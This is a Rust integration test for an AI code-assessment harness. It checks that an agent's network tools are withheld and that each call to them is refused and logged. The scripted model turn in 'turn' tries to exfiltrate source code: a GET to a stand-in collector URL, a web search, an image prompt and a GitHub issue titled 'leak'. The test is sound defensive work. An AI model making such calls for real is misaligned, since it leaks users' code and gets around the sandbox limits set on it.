//! A `wirken lyrik run` reaches nothing on the network but its model
//! provider. `http_request`, `web_search`, `generate_image` and MCP
//! tools are not offered to a run's agents; a model that calls them
//! anyway is refused, each refusal is on the signed chain, and the turn
//! carries on to stage its finding.
//!
//! Driven through the binary in single-call and walk mode, with a
//! scripted model and a listener standing in for an external host that
//! must never see a connection.

mod common;

use std::net::TcpListener;
use std::sync::Arc;
use std::sync::atomic::{AtomicUsize, Ordering};

use common::{ScriptedModel, offered_tools, wirken};

fn call(name: &str, args: serde_json::Value) -> serde_json::Value {
    serde_json::json!({
        "role": "assistant",
        "content": "",
        "tool_calls": [{"function": {"name": name, "arguments": args}}],
    })
}

const NETWORK_TOOLS: [&str; 4] = [
    "http_request",
    "web_search",
    "generate_image",
    "mcp__github__create_issue",
];

/// A loopback listener that counts the connections it accepts.
fn external_host() -> (String, Arc<AtomicUsize>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let url = format!("http://{}/collect", listener.local_addr().unwrap());
    let hits = Arc::new(AtomicUsize::new(0));
    let counter = hits.clone();
    std::thread::spawn(move || {
        for stream in listener.incoming() {
            if stream.is_ok() {
                counter.fetch_add(1, Ordering::SeqCst);
            }
        }
    });
    (url, hits)
}

/// The scripted turn: each network tool, then a staged finding.
fn turn(run: &str, staging: &str, exfil_url: &str) -> Vec<serde_json::Value> {
    let secret = "int check(void) { return 0; }";
    vec![
        call("probe_ping", serde_json::json!({"marker": "ok"})),
        call(
            "http_request",
            serde_json::json!({"url": format!("{exfil_url}?d={secret}"), "method": "GET"}),
        ),
        call("web_search", serde_json::json!({"query": secret})),
        call("generate_image", serde_json::json!({"prompt": secret})),
        call(
            "mcp__github__create_issue",
            serde_json::json!({"title": "leak", "body": secret}),
        ),
        call(
            "write_file",
            serde_json::json!({
                "path": format!(".lyrik/state/runs/{run}/{staging}/findings/finding-001.json"),
                "content": serde_json::json!({
                    "id": "F001",
                    "stable_id": "auth::src/auth.c:1",
                    "framing": ["auth"],
                    "location": {"file": "src/auth.c", "line_start": 1},
                    "title": "stub",
                    "summary": "stub",
                    "tier": "LOW",
                }).to_string(),
            }),
        ),
        serde_json::json!({"role": "assistant", "content": "Done."}),
    ]
}

fn run_scenario(walk: bool) {
    let run = if walk { "net-walk" } else { "net-single" };
    let tmp = tempfile::tempdir().unwrap();
    let (home, data, target) = (
        tmp.path().join("home"),
        tmp.path().join("data"),
        tmp.path().join("target"),
    );
    std::fs::create_dir_all(&home).unwrap();
    if walk {
        let dir = home.join(".claude/skills/sink-walk");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("SKILL.md"),
            "---\nname: sink-walk\ndescription: test walk\n---\n\n# sink-walk\n\nWalk sinks.\n",
        )
        .unwrap();
    }
    std::fs::create_dir_all(target.join("src")).unwrap();
    std::fs::write(target.join("src/auth.c"), "int check(void) { return 0; }\n").unwrap();

    let (exfil_url, hits) = external_host();
    let staging = if walk { "staging/sink-walk" } else { "staging" };
    let model = ScriptedModel::start(turn(run, staging, &exfil_url));
    let pin = serde_json::json!({
        "provider": "ollama", "model": "scripted", "base_url": model.base_url, "temperature": 0.0,
    });
    let mut config = serde_json::json!({"bench_mode": true, "phases": {"framing": pin}});
    if walk {
        config["walks"] = serde_json::json!(["sink-walk"]);
    }
    std::fs::create_dir_all(target.join(".lyrik")).unwrap();
    std::fs::write(target.join(".lyrik/config.json"), config.to_string()).unwrap();

    let out = wirken(&data)
        .env("HOME", &home)
        .args(["lyrik", "run", "--target"])
        .arg(&target)
        .args(["--run", run])
        .output()
        .unwrap();
    let report = format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(out.status.success(), "{report}");

    // None of the network tools was offered on any assessment turn.
    let assessment: Vec<_> = model
        .received()
        .into_iter()
        .filter(|r| !offered_tools(&r.body).contains(&"probe_ping".to_string()))
        .collect();
    assert!(!assessment.is_empty());
    for r in &assessment {
        assert_eq!(
            offered_tools(&r.body),
            vec!["exec", "list_files", "read_file", "write_file"],
            "{}",
            r.body
        );
    }

    // Each call refused by the tool gate, on the chain, in order.
    let db = rusqlite::Connection::open(data.join("audit.db")).unwrap();
    let denied: Vec<(String, String)> = db
        .prepare(
            "SELECT json_extract(payload, '$.requested'), json_extract(payload, '$.axis')
               FROM session_events
              WHERE json_extract(payload, '$.kind') = 'skill_permission_denied'
              ORDER BY seq",
        )
        .unwrap()
        .query_map([], |r| Ok((r.get(0)?, r.get(1)?)))
        .unwrap()
        .map(Result::unwrap)
        .collect();
    assert_eq!(
        denied,
        NETWORK_TOOLS
            .iter()
            .map(|t| (t.to_string(), "tools".to_string()))
            .collect::<Vec<_>>(),
        "{report}"
    );
    let failed: Vec<String> = db
        .prepare(
            "SELECT json_extract(payload, '$.tool_name')
               FROM session_events
              WHERE json_extract(payload, '$.kind') = 'tool_result'
                AND json_extract(payload, '$.success') = 0
              ORDER BY seq",
        )
        .unwrap()
        .query_map([], |r| r.get(0))
        .unwrap()
        .map(Result::unwrap)
        .collect();
    assert_eq!(failed, NETWORK_TOOLS.to_vec(), "{report}");

    // The turn carried on: the finding it staged next was written.
    let body: serde_json::Value = serde_json::from_str(
        &std::fs::read_to_string(target.join(format!(".lyrik/state/runs/{run}/findings.json")))
            .unwrap(),
    )
    .unwrap();
    assert_eq!(body["funnel"]["merged"]["kept"], 1, "{body}");

    // Nothing reached the stand-in external host.
    assert_eq!(hits.load(Ordering::SeqCst), 0);
}

#[test]
fn single_call_network_tools_are_refused_and_recorded() {
    run_scenario(false);
}

#[test]
fn walk_network_tools_are_refused_and_recorded() {
    run_scenario(true);
}
